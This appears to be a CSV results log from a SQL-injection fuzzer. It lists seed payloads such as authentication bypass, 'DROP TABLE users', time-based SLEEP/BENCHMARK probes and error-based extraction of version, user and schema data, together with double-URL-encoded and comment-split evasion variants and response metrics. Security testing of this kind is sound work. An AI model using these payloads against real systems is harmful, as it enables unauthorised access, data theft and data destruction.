root_id,original_sha1,original_preview,best_sha1,input_preview,best_depth,best_category,label,reason,status,length,elapsed,score
seed_00026,34250715df13d527dd4c42095e0dbea919cbf02c,admin'--,34250715df13d527dd4c42095e0dbea919cbf02c,admin'--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00837,100
seed_00027,1d661c7e30131cf3d4a4fadf1a52ce456d805058,admin' #,1d661c7e30131cf3d4a4fadf1a52ce456d805058,admin' #,0,seed,NO_EFFECT,EMPTY_BASELINE_MATCH,200,4479,0.00639,20
seed_00028,434fad611120e2e4d625b8d6eb18de4b1cae3c95,admin'/*,434fad611120e2e4d625b8d6eb18de4b1cae3c95,admin'/*,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,162,0.01467,100
seed_00029,1f6909be5279da7ece0f99b6762e3b75c7996410,' OR 1=1--,1f6909be5279da7ece0f99b6762e3b75c7996410,' OR 1=1--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00686,100
seed_00030,4fd27fdf1a6981d47194b8cd02f03bd82dbc93a6,' OR 1=1#,4fd27fdf1a6981d47194b8cd02f03bd82dbc93a6,' OR 1=1#,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4811,0.00595,100
seed_00031,376051ce046b06a636f644e2e2c32320335300a8,1' OR '1'='1'--,376051ce046b06a636f644e2e2c32320335300a8,1' OR '1'='1'--,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,160,0.00592,100
seed_00032,ea5369ad621f9645461c614b432e098e54003e86,1' OR '1'='1'#,ea5369ad621f9645461c614b432e098e54003e86,1' OR '1'='1'#,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4836,0.00728,100
seed_00033,dc7dd14909c9e5779667e13a71f5864942041a52,1; DROP TABLE users--,ee733c0f66a4a247f13897eec56c7cb2e6456ad9,1%253B%2520DROP%2520TABLE%2520users--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4574,0.00526,100
seed_00034,3d764c001f40e076dde2f8fcc8c791ab189f6dd4,1'; DROP TABLE users--,061ae1aa3bef6b06f5a63ce851f4a7345e1ff597,1%2527%253B%2520DROP%2520TABLE%2520users--,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4579,0.00507,100
seed_00035,8dc789b384dc6dff1d2b381f46466988d07f6523,1 AND SLEEP(5),e2abfe386d8dcedbef556f52d4d66bc3c4f12be2,1%2520AND%2520SLEEP%25285%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4567,0.00481,100
seed_00036,b1b84e510a8b7e42e164a2d2e267e6889b725710,1' AND SLEEP(5)--,836dba9dda5652df120d286b4794c08ca80789eb,1' AN/**/D SL/**/EEP(5)--,1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,182,0.00492,100
seed_00037,317f44898609bd7b9c67cc19e77ab82c4f0114da,1 OR SLEEP(5),ddd7800e848a5243720be304a93b5d37ee27883e,1 O/**/R SLEE/**/P(5),1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4558,0.00544,100
seed_00038,9e2b2af2a5c5980edafcaaf2b5869f79dcd55000,1) OR SLEEP(5)#,e08d0e68c6ed774b4758b7991150265aaef247a1,1%2529%2520OR%2520SLEEP%25285%2529%2523,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4576,0.00492,100
seed_00039,7a7b16d5317475f3d0134dea2216301c0fc358a8,"1 AND IF(1=1,SLEEP(5),0)",a8b7b1b8add55cfd0066a8ffa9c4af9aece66028,1%2520AND%2520IF%25281%253D1%252CSLEEP%25285%2529%252C0%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4597,0.00492,100
seed_00040,a46cd5e7efbff529e18940e8a99baeb5e31304bc,"1 AND extractvalue(1,concat(0x7e,version()))",8298f16262410d5b6169915efdf6dd219d6d2b00,"1 A/**/ND extractvalu/**/e(1,conca/**/t(0x7e,ver/**/sion()))",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4597,0.00494,100
seed_00041,cf2d576369986d93cc61c65cda1f96b2f77dde1b,"1 AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))",d713f9eca596478b4f1d160fae0bb6ea5f78bc5d,"1 AN/**/D extractval/**/ue(1,con/**/cat(0x7e,(SELE/**/CT table_name FR/**/OM i/**/nformation_schema.tables L/**/IMIT ...",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4658,0.00551,100
seed_00042,a156251ab2fa731e441e7734e2916b8c8b04b2ea,"1 AND updatexml(1,concat(0x7e,version()),1)",3c3824ca4958b427c8278e57bc25f42222d72dcb,1%2520AND%2520updatexml%25281%252Cconcat%25280x7e%252Cversion%2528%2529%2529%252C1%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4624,0.00532,100
seed_00043,8916007600e7910dbc9d2e71ad0a134051313728,"1 AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",e0537ded1dd056bd383e8ede667af2a25390e134,1%2520AND%2520%2528SELECT%25201%2520FROM%2528SELECT%2520COUNT%2528%252A%2529%252CCONCAT%2528version%2528%2529%252CFLO...,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4766,0.0069,100
seed_00044,5146c91ebefe6f9c473c02f8eb38339072608d8b,"1 AND (SELECT SUBSTRING(version(),1,1))=5",e61a0d963947940b207d1af3d59ba5052dd149e3,"1 AN/**/D (S/**/ELECT SUBSTRIN/**/G(versi/**/on(),1,1))=5",1,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4594,0.00564,100
seed_00045,3b604021e6eaed9c325e809150ce702733418dff,"1 AND ascii(substring((SELECT user()),1,1))>100",b952e11a22dfa1f8d7996ffd58d08d4dceb3fa2a,1%2520AND%2520ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4640,0.00555,100
seed_00046,0b0ad889fa82610d3585112254c225c98144025f,1 AND (SELECT COUNT(*) FROM information_schema.tables)>0,2608b0822c7cb368952a0790fe384fcbf985d688,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4637,0.00486,100
seed_00047,d5c84ac4658e50d75b7126a81f28e7b8e596ba4a,1 ORDER BY 1,d5c84ac4658e50d75b7126a81f28e7b8e596ba4a,1 ORDER BY 1,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4549,0.00863,100
seed_00048,072cc910e112250df2d73f924e3beec2a48f4739,1 ORDER BY 10,072cc910e112250df2d73f924e3beec2a48f4739,1 ORDER BY 10,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4550,0.00636,100
seed_00049,1cc9908ed70e59c8d2f0232c8425dd5008f8a173,"1 GROUP BY 1,2,3",1cc9908ed70e59c8d2f0232c8425dd5008f8a173,"1 GROUP BY 1,2,3",0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4553,0.00577,100
seed_00050,c78991e8c1648c724292328a7ce3c18f6962bbd7,"1 OR BENCHMARK(5000000,MD5(1))",39482a15b1b375cc951b70dba8860ea97a114e4b,1%2520OR%2520BENCHMARK%25285000000%252CMD5%25281%2529%2529,1,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4595,0.00512,100
seed_00051,04518422cb891731ec524b7cf214b4c5795cd5ee,1%00,04518422cb891731ec524b7cf214b4c5795cd5ee,1%00,0,seed,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,200,4541,0.00709,100
